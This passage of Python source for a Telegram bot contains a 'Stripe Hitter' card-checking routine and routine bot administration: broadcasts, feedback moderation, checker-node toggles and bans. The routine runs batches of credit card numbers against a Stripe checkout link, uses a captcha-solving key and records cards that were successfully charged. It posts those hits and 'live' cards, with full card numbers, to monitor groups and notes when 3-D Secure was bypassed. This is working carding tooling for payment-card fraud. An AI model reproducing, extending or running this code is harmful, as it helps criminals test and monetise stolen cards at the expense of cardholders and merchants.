            "callback_data": f"hit_stop:{stop_key}",
            "icon_custom_emoji_id": E["stop"],
        }]]
    }

    try:
        await safe_edit(loading_msg, "\n\n".join(init_lines), reply_markup=init_kb)
    except Exception:
        pass

    status_msg = loading_msg
    msg_id_first = loading_msg.message_id
    _HIT_EDIT_LOCKS[msg_id_first] = asyncio.Lock()

    # ── Send success to monitor if first CC hit ──
    if _hit_is_success(first_result):
        auth.save_charged_cc(all_ccs[0], user_id, user_name, "Stripe", amount_str)
        try:
            _raw_h = _hit_raw_response(first_result)
            hit_text = (
                f"{_sp()} {bold('CHARGED · STRIPE HIT')}\n\n"
                f"{_sp()} {bold('CC:')} <tg-spoiler>{all_ccs[0]}</tg-spoiler>\n"
                f"{_sp()} {bold('Gate:')} {bold('Stripe Hitter')}\n"
                f"{_sp()} {bold('Merchant:')} {bold(merchant)}\n"
                f"{_sp()} {bold('Amount:')} {bold(amount_str)}\n"
                f"{_sp()} {bold('Response:')} {bold(_raw_h)}\n\n"
                f"{_sp()} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
            )
            await send_hit_animation(message.chat.id, hit_text)
            await bot.send_message(auth.MONITOR_GROUP_ID, hit_text)
        except Exception:
            pass
        # Charged notification to join channel
        await _send_charged_notification(
            user_id=user_id,
            username=user_uname or "",
            full_name=user_name or "",
            amount=amount_str,
            gate_type="stripe",
            is_3d_bypassed=bool(first_result.get("tds_bypassed")),
        )
    elif _hit_is_live(first_result):
        try:
            _raw_l = _hit_raw_response(first_result)
            live_text = (
                f"{_sp()} {bold('CCN LIVE · STRIPE')}\n\n"
                f"{_sp()} {bold('CC:')} <tg-spoiler>{all_ccs[0]}</tg-spoiler>\n"
                f"{_sp()} {bold('Gate:')} {bold('Stripe Hitter')}\n"
                f"{_sp()} {bold('Merchant:')} {bold(merchant)}\n"
                f"{_sp()} {bold('Amount:')} {bold(amount_str)}\n"
                f"{_sp()} {bold('Response:')} {bold(_raw_l)}\n\n"
                f"{_sp()} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
            )
            await send_hit_animation(message.chat.id, live_text)
            await _send_approved(live_text)
        except Exception:
            pass

    # ── If session dead on first CC, stop ──
    if _hit_is_session_dead(first_result):
        _HIT_ACTIVE_USERS.discard(user_id)
        _HIT_STOP_FLAGS.pop(stop_key, None)
        return

    # ── Process remaining CCs sequentially ──
    try:
        for cc in all_ccs[1:]:
            if _HIT_STOP_FLAGS.get(stop_key):
                results[cc] = {"ok": False, "error": "Stopped"}
                continue

            await _hit_check_single(
                cc, checkout_url, user_id, status_msg, results, order,
                user_name, user_uname, stop_key, checkout_info,
                nopecha_key=nopecha_key,
            )

            if _hit_is_success(results.get(cc, {})):
                auth.save_charged_cc(cc, user_id, user_name, "Stripe", amount_str)
                try:
                    _raw_h = _hit_raw_response(results[cc])
                    hit_text = (
                        f"{_sp()} {bold('CHARGED · STRIPE HIT')}\n\n"
                        f"{_sp()} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                        f"{_sp()} {bold('Gate:')} {bold('Stripe Hitter')}\n"
                        f"{_sp()} {bold('Merchant:')} {bold(merchant)}\n"
                        f"{_sp()} {bold('Amount:')} {bold(amount_str)}\n"
                        f"{_sp()} {bold('Response:')} {bold(_raw_h)}\n\n"
                        f"{_sp()} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                    )
                    await send_hit_animation(message.chat.id, hit_text)
                    await bot.send_message(auth.MONITOR_GROUP_ID, hit_text)
                except Exception:
                    pass
                # Charged notification to join channel
                await _send_charged_notification(
                    user_id=user_id,
                    username=user_uname or "",
                    full_name=user_name or "",
                    amount=amount_str,
                    gate_type="stripe",
                    is_3d_bypassed=bool(results.get(cc, {}).get("tds_bypassed")),
                )
            elif _hit_is_live(results.get(cc, {})):
                try:
                    _raw_l = _hit_raw_response(results[cc])
                    live_text = (
                        f"{_sp()} {bold('CCN LIVE · STRIPE')}\n\n"
                        f"{_sp()} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                        f"{_sp()} {bold('Gate:')} {bold('Stripe Hitter')}\n"
                        f"{_sp()} {bold('Merchant:')} {bold(merchant)}\n"
                        f"{_sp()} {bold('Amount:')} {bold(amount_str)}\n"
                        f"{_sp()} {bold('Response:')} {bold(_raw_l)}\n\n"
                        f"{_sp()} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                    )
                    await send_hit_animation(message.chat.id, live_text)
                    await _send_approved(live_text)
                except Exception:
                    pass

            if _HIT_STOP_FLAGS.get(stop_key):
                for remaining_cc in all_ccs[all_ccs.index(cc) + 1:]:
                    if remaining_cc not in results:
                        results[remaining_cc] = {"ok": False, "error": "Stopped (session dead)"}
                break

        # ── Final update (remove stop button) ──
        done_count = sum(1 for cc in order if cc in results)
        final_lines = [
            f"{_sp()} {bold('STRIPE CONSOLE')} {_sp()} {bold(str(done_count))}{bold('/')}{bold(str(total))} {bold('DONE')}\n\n"
            f"{_sp()} {bold('Merchant:')} {bold(merchant)}\n"
            f"{_sp()} {bold('Product:')} {bold(product)}\n"
            f"{_sp()} {bold('Amount:')} {bold(amount_str)}\n"
            f"{_sp()} {bold('Link:')} {bold(link_short)}\n"
            f"{_sp()} {bold('Return URL:')} {bold(success_url)}\n"
        ]
        for cc in order:
            if cc in results:
                final_lines.append(_hit_cc_block(cc, results[cc]))
        if skipped > 0:
            final_lines.append(f"\n{_sp()} {bold(str(skipped))} {bold('CCs skipped (max')} {bold(str(HIT_MAX_CCS))}{bold(')')}")

        dead_any = any(_hit_is_session_dead(results.get(cc, {})) for cc in order)
        if dead_any:
            final_lines.append(f"\n{_sp()} {bold('SESSION EXPIRED · RUN HALTED')}")

        final_lines.append(f"\n{_sp()} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

        try:
            await safe_edit(status_msg, "\n\n".join(final_lines), reply_markup=None)
        except Exception:
            pass

        # Pin if any success
        if any(_hit_is_success(results.get(cc, {})) for cc in order):
            try:
                await bot.pin_chat_message(message.chat.id, status_msg.message_id, disable_notification=True)
            except Exception:
                pass

    finally:
        _HIT_ACTIVE_USERS.discard(user_id)
        _HIT_STOP_FLAGS.pop(stop_key, None)
        _HIT_EDIT_LOCKS.pop(msg_id_first, None)


@router.callback_query(F.data.startswith("hit_stop:"))
async def cb_hit_stop(callback: types.CallbackQuery):
    stop_key = callback.data.split(":", 1)[1]
    parts = stop_key.split(":")
    if len(parts) >= 3:
        owner_id = int(parts[2])
    else:
        owner_id = 0

    # Allow owner OR the user who started the check
    if callback.from_user.id != owner_id and not auth.is_owner(callback.from_user.id):
        await callback.answer(bold("Only the owner can stop this check!"), show_alert=True)
        return

    _HIT_STOP_FLAGS[stop_key] = True
    await callback.answer(bold("Stopping Stripe check..."), show_alert=True)


# ══════════════════════════════════════════════════════════════════════════════
#  /broad COMMAND — Owner broadcasts message to all users
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("broad"))
async def cmd_broad(message: types.Message):
    if not auth.is_owner(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    broadcast_text = None
    broadcast_entities = None
    use_copy = False
    reply_msg = None

    # ── Mode 1: Reply to a message ────────────────────────────────────────────
    if message.reply_to_message:
        use_copy = True
        reply_msg = message.reply_to_message

    # ── Mode 2: Inline text after /broad ──────────────────────────────────────
    else:
        raw_text = message.text or ""
        raw_entities = message.entities or []

        # Find where /broad command ends
        cmd_end = 0
        for ent in raw_entities:
            if ent.type == "bot_command" and ent.offset == 0:
                cmd_end = ent.offset + ent.length
                break

        if cmd_end == 0:
            cmd_end = len("/broad")

        # Strip the command prefix and any leading whitespace/newline
        remaining = raw_text[cmd_end:]
        # Count how many chars of whitespace/newline after command
        stripped = remaining.lstrip("\n \t")
        ws_count = len(remaining) - len(stripped)
        total_prefix = cmd_end + ws_count

        broadcast_text = stripped

        if not broadcast_text:
            await message.reply(
                f"{pe(E['warn'])} {bold('Usage:')}\n\n"
                f"{pe(E['next'])} /broad {bold('Your message here')}\n"
                f"{pe(E['next'])} {bold('Or reply to any message with')} /broad"
            )
            return

        # Shift entities: only keep entities that fall within the broadcast text
        adjusted = []
        for ent in raw_entities:
            if ent.type == "bot_command" and ent.offset == 0:
                continue  # Skip the /broad command entity itself

            new_offset = ent.offset - total_prefix
            # Only include entities that are within the broadcast text
            if new_offset >= 0 and (new_offset + ent.length) <= len(broadcast_text):
                adjusted.append(types.MessageEntity(
                    type=ent.type,
                    offset=new_offset,
                    length=ent.length,
                    url=ent.url if hasattr(ent, 'url') else None,
                    user=ent.user if hasattr(ent, 'user') else None,
                    language=ent.language if hasattr(ent, 'language') else None,
                    custom_emoji_id=ent.custom_emoji_id if hasattr(ent, 'custom_emoji_id') else None,
                ))

        broadcast_entities = adjusted if adjusted else None

    # ── Get all user IDs ──────────────────────────────────────────────────────
    all_ids = auth.get_all_user_ids()
    total = len(all_ids)

    if total == 0:
        await message.reply(f"{pe(E['cross'])} {bold('No users found in users.txt!')}")
        return

    # ── Status message ────────────────────────────────────────────────────────
    status_msg = await message.reply(
        f"{pe(E['rocket'])} {bold('Broadcasting...')}\n\n"
        f"{pe(E['bolt'])} {bold('Total Users:')} {bold(str(total))}\n"
        f"{pe(E['hourglass'])} {bold('Sending...')} {bold('0')}/{bold(str(total))}"
    )

    counters = {"sent": 0, "failed": 0, "blocked": 0, "pinned": 0, "done": 0}
    lock = asyncio.Lock()
    failed_ids: list[int] = []
    sem = asyncio.Semaphore(25)  # 25 concurrent sends ≈ safe Telegram flood limit

    async def _send_one(uid: int) -> bool:
        async with sem:
            try:
                if use_copy:
                    r = await bot.copy_message(
                        chat_id=uid,
                        from_chat_id=reply_msg.chat.id,
                        message_id=reply_msg.message_id,
                    )
                else:
                    r = await bot.send_message(
                        chat_id=uid,
                        text=broadcast_text,
                        entities=broadcast_entities,
                    )
                try:
                    await bot.pin_chat_message(uid, r.message_id, disable_notification=True)
                    async with lock:
                        counters["pinned"] += 1
                except Exception:
                    pass
                async with lock:
                    counters["sent"] += 1
                return True
            except Exception as e:
                err = str(e).lower()
                async with lock:
                    if "blocked" in err or "deactivated" in err or "not found" in err:
                        counters["blocked"] += 1
                    else:
                        counters["failed"] += 1
                        failed_ids.append(uid)
                return False
            finally:
                async with lock:
                    counters["done"] += 1

    # ── Progress updater ──────────────────────────────────────────────────────
    async def _update_progress(phase: str):
        while True:
            await asyncio.sleep(1.5)
            async with lock:
                d = counters["done"]
            try:
                await safe_edit(status_msg, 
                    f"{pe(E['rocket'])} {bold(phase)}\n\n"
                    f"{pe(E['bolt'])} {bold('Progress:')} {bold(str(d))}/{bold(str(total))}\n"
                    f"{pe(E['check'])} {bold('Sent:')} {bold(str(counters['sent']))}\n"
                    f"{pe(E['star'])} {bold('Pinned:')} {bold(str(counters['pinned']))}\n"
                    f"{pe(E['cross'])} {bold('Blocked:')} {bold(str(counters['blocked']))}\n"
                    f"{pe(E['warn'])} {bold('Failed:')} {bold(str(counters['failed']))}"
                )
            except Exception:
                pass
            if d >= total:
                break

    # ── Pass 1: send to everyone in parallel ─────────────────────────────────
    prog_task = asyncio.create_task(_update_progress("Broadcasting..."))
    await asyncio.gather(*[_send_one(uid) for uid in all_ids])
    prog_task.cancel()

    # ── Pass 2: retry failed users ───────────────────────────────────────────
    if failed_ids:
        retry_list = list(failed_ids)
        failed_ids.clear()
        counters["failed"] = 0
        counters["done"] = 0
        total_retry = len(retry_list)
        total = total_retry

        try:
            await safe_edit(status_msg, 
                f"{pe(E['refresh'])} {bold('Retrying')} {bold(str(total_retry))} {bold('failed users...')}"
            )
        except Exception:
            pass

        await asyncio.sleep(2)
        prog_task2 = asyncio.create_task(_update_progress("Retrying failed..."))
        await asyncio.gather(*[_send_one(uid) for uid in retry_list])
        prog_task2.cancel()

    # ── Final summary ─────────────────────────────────────────────────────────
    try:
        await safe_edit(status_msg, 
            f"{pe(E['check'])} {bold('Broadcast Complete!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total Users:')} {bold(str(len(all_ids)))}\n"
            f"{pe(E['check'])} {bold('Delivered:')} {bold(str(counters['sent']))}\n"
            f"{pe(E['star'])} {bold('Pinned:')} {bold(str(counters['pinned']))}\n"
            f"{pe(E['cross'])} {bold('Blocked/Deactivated:')} {bold(str(counters['blocked']))}\n"
            f"{pe(E['warn'])} {bold('Still Failed:')} {bold(str(counters['failed']))}"
        )
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  ZEN / GameSeal — DISABLED
# ══════════════════════════════════════════════════════════════════════════════
# /z, /mz, /ztxt commands commented out — uncomment gameseal_auto import to re-enable



def _fb_e() -> str:
    return pe(random.choice(_FB_EMOJIS))


def _fb_shift_entities(
    entities: list[types.MessageEntity] | None,
    text: str,
    skip_prefix: int,
) -> list[types.MessageEntity]:
    """Keep entities inside ``text`` after removing ``skip_prefix`` chars from the start."""
    if not entities or skip_prefix <= 0:
        return list(entities or [])
    out: list[types.MessageEntity] = []
    for ent in entities:
        if ent.type == MessageEntityType.BOT_COMMAND and ent.offset == 0:
            continue
        new_off = ent.offset - skip_prefix
        if new_off < 0:
            continue
        if new_off + ent.length > len(text):
            continue
        out.append(types.MessageEntity(
            type=ent.type,
            offset=new_off,
            length=ent.length,
            url=getattr(ent, "url", None),
            user=getattr(ent, "user", None),
            language=getattr(ent, "language", None),
            custom_emoji_id=getattr(ent, "custom_emoji_id", None),
        ))
    return out


def _fb_text_to_html(text: str, entities: list[types.MessageEntity] | None) -> str:
    """Plain text + entities → HTML; custom premium emoji kept as ``<tg-emoji>``."""
    if not text:
        return ""
    if not entities:
        return _html.escape(text)

    custom = [
        e for e in entities
        if e.type == MessageEntityType.CUSTOM_EMOJI and getattr(e, "custom_emoji_id", None)
    ]
    if not custom:
        return _html.escape(text)

    custom.sort(key=lambda e: e.offset)
    parts: list[str] = []
    pos = 0
    for ent in custom:
        if ent.offset > pos:
            parts.append(_html.escape(text[pos:ent.offset]))
        eid = str(ent.custom_emoji_id)
        parts.append(pe(eid))
        pos = ent.offset + ent.length
    parts.append(_html.escape(text[pos:]))
    return "".join(parts)


def _fb_parse_input(message: types.Message) -> tuple[str | None, str, list[types.MessageEntity]]:
    """Return (photo_file_id, feedback_text, entities for feedback text)."""
    photo: str | None = None
    caption = ""
    entities: list[types.MessageEntity] = []

    if message.photo:
        photo = message.photo[-1].file_id
        raw = (message.caption or "").strip()
        prefix = 0
        if raw.startswith("/f"):
            parts = raw.split(maxsplit=1)
            prefix = len(parts[0])
            caption = parts[1].strip() if len(parts) > 1 else ""
        else:
            caption = raw
        entities = _fb_shift_entities(message.caption_entities, caption, prefix)

    elif message.reply_to_message and message.reply_to_message.photo:
        photo = message.reply_to_message.photo[-1].file_id
        reply_cap = (message.reply_to_message.caption or "").strip()
        cmd_text = (message.text or "").strip()
        if cmd_text.startswith("/f"):
            parts = cmd_text.split(maxsplit=1)
            cmd_prefix = len(parts[0])
            cmd_body = parts[1].strip() if len(parts) > 1 else ""
            if cmd_body:
                if reply_cap:
                    caption = reply_cap + "\n" + cmd_body
                    entities = list(message.reply_to_message.caption_entities or [])
                    base = len(reply_cap) + 1
                    for ent in _fb_shift_entities(message.entities, cmd_body, cmd_prefix):
                        entities.append(types.MessageEntity(
                            type=ent.type,
                            offset=ent.offset + base,
                            length=ent.length,
                            url=getattr(ent, "url", None),
                            user=getattr(ent, "user", None),
                            language=getattr(ent, "language", None),
                            custom_emoji_id=getattr(ent, "custom_emoji_id", None),
                        ))
                else:
                    caption = cmd_body
                    entities = _fb_shift_entities(message.entities, cmd_body, cmd_prefix)
            else:
                caption = reply_cap
                entities = list(message.reply_to_message.caption_entities or [])
        else:
            caption = reply_cap
            entities = list(message.reply_to_message.caption_entities or [])

    return photo, caption, entities


_fb_store: dict[str, dict] = {}
_fb_processed: set[str] = set()


@router.message(Command("f"))
async def cmd_feedback(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    photo, caption, caption_entities = _fb_parse_input(message)
    caption_html = _fb_text_to_html(caption, caption_entities)

    if not photo or not caption:
        await message.reply(
            f"{_fb_e()} {bold('Feedback Usage')}\n\n"
            f"{_fb_e()} {bold('Send a photo with caption:')}\n"
            f"    /f your feedback message\n\n"
            f"{_fb_e()} {bold('Or reply to a photo with:')}\n"
            f"    /f your feedback message\n\n"
            f"{pe(E['warn'])} {bold('Both photo and message are required!')}"
        )
        return

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    now = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    fb_key = f"{user_id}:{message.message_id}"

    _fb_store[fb_key] = {
        "photo": photo,
        "caption": caption,
        "caption_html": caption_html,
        "uid": user_id,
        "name": user_name,
        "uname": user_uname,
        "date": now,
    }

    admin_text = (
        f"{_fb_e()} {bold('New Feedback Received!')}\n\n"
        f"{_fb_e()} {bold('From:')} {user_link(user_id, user_name, user_uname)}\n"
        f"{_fb_e()} {bold('Name:')} {bold(_html.escape(user_name))}\n"
        f"{_fb_e()} {bold('Username:')} {bold('@' + _html.escape(user_uname) if user_uname else '-')}\n"
        f"{_fb_e()} {bold('User ID:')} {bold(str(user_id))}\n"
        f"{_fb_e()} {bold('Date:')} {bold(now)}\n\n"
        f"{_fb_e()} {bold('Message:')}\n{caption_html}"
    )

    fb_kb = {
        "inline_keyboard": [[
            {
                "text": f"{bold('Accept')}",
                "callback_data": f"fb_accept:{fb_key}",
                "icon_custom_emoji_id": E["check"],
                "style": "primary",
            },
            {
                "text": f"{bold('Reject')}",
                "callback_data": f"fb_reject:{fb_key}",
                "icon_custom_emoji_id": E["cross"],
                "style": "danger",
            },
        ]]
    }

    admins = auth.load_admins()
    if auth.OWNER_ID and auth.OWNER_ID not in admins:
        admins.append(auth.OWNER_ID)

    sent_count = 0
    for admin_id in admins:
        try:
            await bot.send_photo(
                admin_id,
                photo,
                caption=admin_text,
                parse_mode=ParseMode.HTML,
                reply_markup=fb_kb,
            )
            sent_count += 1
        except Exception:
            pass

    if sent_count > 0:
        await message.reply(
            f"{_fb_e()} {bold('Feedback Sent Successfully!')}\n\n"
            f"{_fb_e()} {bold('Your feedback has been submitted to the admins.')}\n"
            f"{_fb_e()} {bold('Thank you for your feedback!')}"
        )
    else:
        await message.reply(f"{pe(E['cross'])} {bold('Failed to send feedback. Try again later.')}")


@router.callback_query(F.data.startswith("fb_accept:"))
async def cb_feedback_accept(callback: types.CallbackQuery):
    if not auth.is_admin(callback.from_user.id):
        await callback.answer(bold("Admins only!"), show_alert=True)
        return

    fb_key = callback.data.split(":", 1)[1]

    if fb_key in _fb_processed:
        await callback.answer(bold("This feedback is already processed!"), show_alert=True)
        return

    fb = _fb_store.get(fb_key)
    if not fb:
        await callback.answer(bold("Feedback expired or not found!"), show_alert=True)
        return

    _fb_processed.add(fb_key)

    uid = fb["uid"]
    name = fb["name"]
    uname = fb["uname"]
    date = fb["date"]
    caption = fb["caption"]
    caption_html = fb.get("caption_html") or _html.escape(caption)
    photo = fb["photo"]

    group_text = (
        f"{_fb_e()} {bold('Bot Feedback')}\n\n"
        f"{_fb_e()} {bold('Bot:')} @soon\n"
        f"{_fb_e()} {bold('From:')} {user_link(uid, name, uname)}\n"
        f"{_fb_e()} {bold('Name:')} {bold(_html.escape(name))}\n"
        f"{_fb_e()} {bold('Username:')} {bold('@' + _html.escape(uname) if uname else '-')}\n"
        f"{_fb_e()} {bold('User ID:')} {bold(str(uid))}\n"
        f"{_fb_e()} {bold('Date:')} {bold(date)}\n\n"
        f"{_fb_e()} {bold('Feedback:')}\n{caption_html}\n\n"
        f"{_fb_e()} {bold('Approved by:')} {user_link(callback.from_user.id, callback.from_user.full_name or '', callback.from_user.username or '')}"
    )

    try:
        sent = await bot.send_photo(
            FEEDBACK_GROUP_ID, photo, caption=group_text, parse_mode=ParseMode.HTML,
        )
        try:
            await bot.pin_chat_message(FEEDBACK_GROUP_ID, sent.message_id, disable_notification=True)
        except Exception:
            pass
    except Exception:
        _fb_processed.discard(fb_key)
        await callback.answer(bold("Failed to send to group!"), show_alert=True)
        return

    msg = callback.message
    try:
        await msg.edit_caption(
            caption=(msg.caption or "") + f"\n\n{pe(E['check'])} {bold('Accepted by')} {user_link(callback.from_user.id, callback.from_user.full_name or '', callback.from_user.username or '')}",
            parse_mode=ParseMode.HTML,
            reply_markup=None,
        )
    except Exception:
        pass

    _fb_store.pop(fb_key, None)
    await callback.answer(bold("Feedback accepted & posted!"), show_alert=True)


@router.callback_query(F.data.startswith("fb_reject:"))
async def cb_feedback_reject(callback: types.CallbackQuery):
    if not auth.is_admin(callback.from_user.id):
        await callback.answer(bold("Admins only!"), show_alert=True)
        return

    fb_key = callback.data.split(":", 1)[1]

    if fb_key in _fb_processed:
        await callback.answer(bold("This feedback is already processed!"), show_alert=True)
        return

    _fb_processed.add(fb_key)

    msg = callback.message
    try:
        await msg.edit_caption(
            caption=(msg.caption or "") + f"\n\n{pe(E['cross'])} {bold('Rejected by')} {user_link(callback.from_user.id, callback.from_user.full_name or '', callback.from_user.username or '')}",
            parse_mode=ParseMode.HTML,
            reply_markup=None,
        )
    except Exception:
        pass

    _fb_store.pop(fb_key, None)
    await callback.answer(bold("Feedback rejected."), show_alert=True)


# ══════════════════════════════════════════════════════════════════════════════
#  /api COMMAND — Owner: check + toggle checker API nodes
# ══════════════════════════════════════════════════════════════════════════════

async def _build_api_message() -> tuple[str, dict]:
    """
    Build the /api status message + inline keyboard.
    Pings all nodes in parallel and shows health + enabled/disabled toggle.
    """
    nodes = checker_bridge.get_all_nodes()

    # Ping all nodes concurrently
    health_tasks = [checker_bridge.check_node_health(n) for n in nodes]
    health_results = await asyncio.gather(*health_tasks, return_exceptions=True)

    lines = [f"{pe(E['globe'])} {bold('Checker API Nodes')}\n"]
    kb_rows = []

    for i, (node, alive) in enumerate(zip(nodes, health_results)):
        if isinstance(alive, Exception):
            alive = False

        disabled = checker_bridge.is_node_disabled(node)
        ip_port  = node.replace("http://", "")

        # Status indicators
        if disabled:
            status_icon = pe(E["cross"])
            status_text = bold("DISABLED")
        elif alive:
            status_icon = pe(E["check"])
            status_text = bold("Online")
        else:
            status_icon = pe(E["warn"])
            status_text = bold("Offline")

        lines.append(
            f"{pe(E['bolt'])} {bold(f'Node {i+1}:')} {bold(ip_port)}\n"
            f"   {status_icon} {status_text}"
        )

        # Toggle button: if currently disabled → show Enable (green), else show Disable (red)
        if disabled:
            btn_text  = f"{bold(f'Node {i+1}')} — Enable"
            btn_style = "success"
        else:
            btn_text  = f"{bold(f'Node {i+1}')} — Disable"
            btn_style = "danger"

        kb_rows.append([{
            "text":          btn_text,
            "callback_data": f"api_toggle:{i}",
            "style":         btn_style,
        }])

    # Refresh button at the bottom
    kb_rows.append([{
        "text":          f"{bold('Refresh Status')}",
        "callback_data": "api_refresh",
        "icon_custom_emoji_id": E["refresh"],
        "style":         "primary",
    }])

    text = "\n\n".join(lines)
    keyboard = {"inline_keyboard": kb_rows}
    return text, keyboard


@router.message(Command("api"))
async def cmd_api(message: types.Message):
    if not auth.is_owner(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    loading = await message.reply(f"{pe(E['loading'])} {bold('Checking all API nodes...')}")
    text, kb = await _build_api_message()
    try:
        await safe_edit(loading, text, reply_markup=kb)
    except Exception:
        pass


@router.callback_query(F.data.startswith("api_toggle:"))
async def cb_api_toggle(callback: types.CallbackQuery):
    if not auth.is_owner(callback.from_user.id):
        await callback.answer(bold("Owner only!"), show_alert=True)
        return

    try:
        idx = int(callback.data.split(":", 1)[1])
    except (ValueError, IndexError):
        await callback.answer()
        return

    nodes = checker_bridge.get_all_nodes()
    if idx < 0 or idx >= len(nodes):
        await callback.answer(bold("Invalid node index."), show_alert=True)
        return

    node = nodes[idx]
    ip_port = node.replace("http://", "")

    if checker_bridge.is_node_disabled(node):
        checker_bridge.enable_node(node)
        await callback.answer(f"Node {idx+1} ({ip_port}) ENABLED", show_alert=False)
    else:
        checker_bridge.disable_node(node)
        await callback.answer(f"Node {idx+1} ({ip_port}) DISABLED", show_alert=False)

    # Rebuild and update the message
    text, kb = await _build_api_message()
    try:
        await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        pass


@router.callback_query(F.data == "api_refresh")
async def cb_api_refresh(callback: types.CallbackQuery):
    if not auth.is_owner(callback.from_user.id):
        await callback.answer(bold("Owner only!"), show_alert=True)
        return

    await callback.answer(bold("Refreshing..."))
    text, kb = await _build_api_message()
    try:
        await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  OWNER BAN COMMANDS
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("ban"))
async def cmd_ban(message: types.Message):
    """Owner: /ban <user_id>  or reply to a message."""
    if not auth.is_owner(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    target_id: int | None = None

    # Reply-to case
    if message.reply_to_message and message.reply_to_message.from_user:
        target_id = message.reply_to_message.from_user.id

    # Argument case: /ban 123456789
    if not target_id:
        args = (message.text or "").split()
        if len(args) >= 2:
            try:
                target_id = int(args[1])
            except ValueError:
                pass

    if not target_id:
        await message.reply(
            f"{pe(E['cross'])} {bold('Usage:')} /ban &lt;user_id&gt;  or reply to a message"
        )
        return

    if target_id == message.from_user.id:
        await message.reply(f"{pe(E['warn'])} {bold('You cannot ban yourself.')}")
        return

    if auth.is_owner(target_id):
        await message.reply(f"{pe(E['warn'])} {bold('Cannot ban the owner.')}")
        return

    ban_user(target_id)
    await message.reply(
        f"{pe(E['check'])} {bold('User Banned!')}\n"
        f"{pe(E['bolt'])} {bold('ID:')} <code>{target_id}</code>\n"
        f"{pe(E['warn'])} {bold('All future messages from this user will be silently dropped.')}"
    )


@router.message(Command("unban"))
async def cmd_unban(message: types.Message):
    """Owner: /unban <user_id>"""
    if not auth.is_owner(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    args = (message.text or "").split()
    if len(args) < 2:
        await message.reply(f"{pe(E['cross'])} {bold('Usage:')} /unban &lt;user_id&gt;")
        return

    try:
        target_id = int(args[1])
    except ValueError:
        await message.reply(f"{pe(E['cross'])} {bold('Invalid user ID.')}")
        return

    if target_id not in _banned_users:
        await message.reply(f"{pe(E['warn'])} {bold('User')} <code>{target_id}</code> {bold('is not banned.')}")
        return

    unban_user(target_id)
    await message.reply(
        f"{pe(E['check'])} {bold('User Unbanned!')}\n"
        f"{pe(E['bolt'])} {bold('ID:')} <code>{target_id}</code>"
    )


@router.message(Command("banned"))
async def cmd_banned_list(message: types.Message):
    """Owner: show all banned users."""
    if not auth.is_owner(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('Owner only command!')}")
        return

    if not _banned_users:
        await message.reply(f"{pe(E['check'])} {bold('No banned users.')}")
        return

    lines = [f"{pe(E['cross'])} {bold(f'Banned Users ({len(_banned_users)}):')}\n"]
    for uid in sorted(_banned_users):
        lines.append(f"  • <code>{uid}</code>")

    lines.append(f"\n{pe(E['warn'])} {bold('Use /unban &lt;id&gt; to unban.')}")
    await message.reply("\n".join(lines))


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN ENTRY
# ══════════════════════════════════════════════════════════════════════════════

async def main():
    me = await bot.get_me()
    log.info(f"⚡ Bot @{me.username} is running...")

    # Log all registered handlers for debugging
    for obs in router.message.handlers:
        log.info(f"  📌 Registered handler: {obs.callback.__name__}")

    await bot.delete_webhook(drop_pending_updates=True)
    try:
        # skip_updates=True drops ALL queued updates from when the bot was offline.
        # Without this, every /ran sent during downtime floods the event loop on restart.
        # allowed_updates whitelist prevents Telegram from sending exotic update types
        # (rich_message, etc.) that cause pydantic model_validate to hang indefinitely
        # on deeply-nested recursive JSON payloads (DoS vector).
        await dp.start_polling(
            bot,
            skip_updates=True,
            allowed_updates=[
                "message",
                "edited_message",
                "callback_query",
                "inline_query",
                "chat_member",
                "my_chat_member",
                "chat_join_request",
            ],
        )
    finally:
        CHECKER_POOL.shutdown(wait=False)
        await close_session()
        await bot.session.close()


if __name__ == "__main__":
    # Raise OS file descriptor limit to prevent "too many open files" under load
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        target = min(65536, hard)
        if soft < target:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
            log.info(f"📂 Raised fd limit: {soft} → {target}")
    except Exception:
        pass  # Windows or restricted — handled by reduced thread count
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        log.info("Bot stopped.")
